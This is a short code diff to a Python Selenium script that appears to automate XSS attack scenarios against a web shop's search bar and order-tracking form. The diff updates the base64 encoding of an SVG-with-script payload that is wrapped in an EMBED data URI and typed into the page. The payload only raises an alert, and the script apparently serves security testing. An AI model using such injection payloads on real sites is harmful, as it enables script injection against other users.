@@ -597,8 +597,9 @@ def scenario_xss_searchbar_attack(driver, verbose=config.config['verbose']):
     elif attackType == 8:
         attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
         base64String = "<svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.0\" x=\"0\" y=\"0\" width=\"194\" height=\"200\" id=\"xss\"><script type=\"text/ecmascript\">alert(\"" + attackKeyWord + "\");</script></svg>"
-        base64decodeString = base64.b64encode(base64String)
-        attack = "<EMBED SRC=\"data:image/svg+xml;base64," + base64decodeString + "\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>"
+        base64decodeString = base64.b64encode(base64String.encode())
+        attack = "<EMBED SRC=\"data:image/svg+xml;base64," + str(base64decodeString)[2:-1] + "\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>"
+        
     
     # 3-2. attack in search bar
     driver.find_element_by_xpath('/html/body/nav/div/ul/li[4]/form/div/input').clear()
@@ -692,8 +693,8 @@ def scenario_xss_trackorders_attack(driver, verbose=config.config['verbose']):
     elif attackType == 8:
         attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
         base64String = "<svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.0\" x=\"0\" y=\"0\" width=\"194\" height=\"200\" id=\"xss\"><script type=\"text/ecmascript\">alert(\"" + attackKeyWord + "\");</script></svg>"
-        base64decodeString = base64.b64encode(base64String)
-        attack = "<EMBED SRC=\"data:image/svg+xml;base64," + base64decodeString + "\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>"
+        base64decodeString = base64.b64encode(base64String.encode())
+        attack = "<EMBED SRC=\"data:image/svg+xml;base64," + str(base64decodeString)[2:-1] + "\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>"
 
     
     # 3-2. attack in tracking orders
